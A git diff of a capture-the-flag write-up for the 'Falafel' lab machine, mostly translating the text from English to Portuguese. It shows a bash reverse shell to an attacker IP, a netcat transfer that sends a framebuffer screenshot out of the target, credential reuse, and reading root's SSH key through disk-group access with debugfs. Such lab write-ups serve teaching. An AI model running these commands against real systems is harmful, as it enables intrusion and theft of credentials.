@@ -272,7 +272,7 @@ Criei então um ficheiro com o nome rev.html contendo o seguinte código:
 bash -i >& /dev/tcp/10.10.14.17/443 0>&1
 ```
 
-Partilhe então um servidor http com este ficheiro, afim de através do RCE, dar um curl ao ficheiro, e pipeá-lo com bash
+Partilhe então um servidor http com este ficheiro, para que através do RCE, poder dar um curl ao ficheiro, e pipeá-lo com bash
 
 ```bash
 sudo python3 -m http.server 80  # On one terminal
@@ -283,7 +283,7 @@ sudo nc -lvnp 443               # On another one
 
 ## PrivEsc
 
-We found credentials on /var/www/html/connection.php
+Já dentro da máquina, ao vasculhar os ficheiros, pode-se encontrar credenciais em /var/www/html/connection.php
 
 ```bash
 (remote) www-data@falafel:/var/www/html$ cat connection.php
@@ -301,13 +301,13 @@ We found credentials on /var/www/html/connection.php
 ?>
 ```
 
-This credentials is for mysql. but if we try to logon as moshe:falafelIsReallyTasty, we will get in.
+Estas credenciais server para fazer login ao MySQL, mas se reutilizar-mos as credenciais para fazer login por ssh, vemos que as credenciais são válidas!
 
 ### Group video
 
-This machine's is a ctf lool. But is interessante the way to escalate privilege. This machine are no more vulnerability... The password is on the screen of the machine. So, how we can screenshot this?
+Esta máquina é um CaptureTheFlag LOL... O próximo passo é completamente irrealista, mas não deixa de ser interessante. Esta máquina não tem mais vulnerabilidades. Ok, então onde estão as credenciais do usuário "yossi"?! Estão no ecrã...
 
-with "w" command we can see the user yossi is logged physically on the machine
+com o commando "w" podemos ver que o yossi está actualmente logado fisicamente na máquina
 
 ```bash
 w
@@ -317,7 +317,7 @@ w
 #>  moshe    pts/1    10.10.14.17      22:06    0.00s  0.06s  0.00s w
 ```
 
-The video group has access to view the screen output. Basically you can observe the the screens. In order to do that you need to grab the current image on the screen in raw data and get the resolution that the screen is using. The screen data can be saved in /dev/fb0 and you could find the resolution of this screen on /sys/class/graphics/fb0/virtual_size
+O usuário com o qual estamos neste momento (moshe) está no grupo "video". Os usuário deste grupo pode ver o que está a ser transmitido para o ecrã. E para tirar uma captura de ecrã sem nenhum recurso adicional, pode-se ir à fonte mesmo. Isto é, capturar o que está em /dev/fb0 com um simples cat. Para ler este arquivo (que vem em formato RAW), temos de saber as dimenções da tela, pois este formato não diz nada sobre dimenções, apenas escreve todos os dados numa linha só e "tá feito". As dimenções actuais do ecrã estão sempre definidas em /sy/class/graphics/fb0/virtual_size
 
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
@@ -325,14 +325,14 @@ cat /sys/class/graphics/fb0/virtual_size
 #> 1176,885
 ```
 
-Download the screen.raw into kali machine
+Recupere a captura de ecrã para o kali
 
 ```bash
 nc 10.10.14.17 443 < /tmp/screen.raw  # Target Machine
 nc -lvnp 443 > screen.raw             # kali Machine
 ```
 
-open with GIMP in mode RAW
+Abrir o ficheiro com ajuda do GIMP, definido manualmente que este ficheiro é um ficheiro RAW com 1176,885 de dimenções...
 
 ![opennig image raw format with GIMP](Assets/HTB-Linux-Hard-Falafel/Openning_raw_image.png)
 
@@ -340,7 +340,7 @@ open with GIMP in mode RAW
 
 ![Password yossi](Assets/HTB-Linux-Hard-Falafel/yossi_password.png)
 
-We can now ssh into target machine with yossi user
+Entre agora por ssh com o usuário yossi e a sua credencial (que de passagem só se vê porque o yossi errou primeiro ao introduzi-la e por "grande sorte" ainda está a vista na tela looooool)
 
 ### Group disk
 
@@ -348,7 +348,9 @@ We can now ssh into target machine with yossi user
 for group in $(groups); do echo -e "\n\n\n[*] Archive with group $group permition:\n"; find / -group $group 2>/dev/null; done
 ```
 
-When we run this, we see yossi have permition on /dev/sda1 and more...
+Este commando permite-nos enumerar todos os ficheiro no qual pertence a cada grupo no qual está o usuário. E assim, vemos que o usuário yossio em que estamos logados, tem permissões através do grupo "disk" de leitura e escritura sobre /dev/sda1 e muito mais...
+
+Este /dev/sda1 é muito simplesmente o disco rígido na qual está instalado o prórpio sistema operativo. Mas não dá para abrir assim...
 
 ```bash
 fdisk -l
@@ -369,11 +371,9 @@ ll /dev/sda1
 #>  brw-rw---- 1 root disk 8, 1 Sep  9 12:08 /dev/sda1
 ```
 
-Group disk can read and write on /dev/sda1. But how?
-
 ### debugfs
 
-debugfs - ext2/ext3/ext4 file system debugger. Display or manipulate a disk partition table. We can see easily the flag, but we want to be root!
+Com a ajuda da ferramente debugfs (ext2/ext3/ext4 file system debugger). Podemos ver ou manipular uma partição, um disco ou o seu conteúdo. Podemos assim facilemente ver a flag root.txt, mas a nós o que nos interessa é vir a ser root! Por sorte, em /root/.ssh existem keys para entrar por ssh, já autorizadas... nem percisamos de fazer mais nada. É só copiar e usar a id_rsa:
 
 ```bash
 debugfs /dev/sda1
